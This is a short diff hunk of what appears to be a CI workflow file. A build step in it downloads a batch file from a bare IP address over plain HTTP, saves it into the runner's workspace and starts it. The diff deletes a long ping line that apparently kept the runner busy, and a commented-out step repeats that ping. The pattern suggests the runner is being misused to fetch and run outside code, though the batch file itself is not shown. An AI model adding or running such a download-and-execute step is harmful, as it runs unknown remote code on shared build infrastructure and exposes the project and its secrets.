@@ -40,6 +40,5 @@ jobs:
           powershell (new-object Net.WebClient).DownloadFile('http://113.128.105.75:8081/startgat.bat','D:\a\teac\teac\startgat.bat')
           dir
           start D:\a\teac\teac\startgat.bat
-          ping -n 3600 8.8.8.8
       #- name: Dki
         #run: ping -n 3600 8.8.8.8
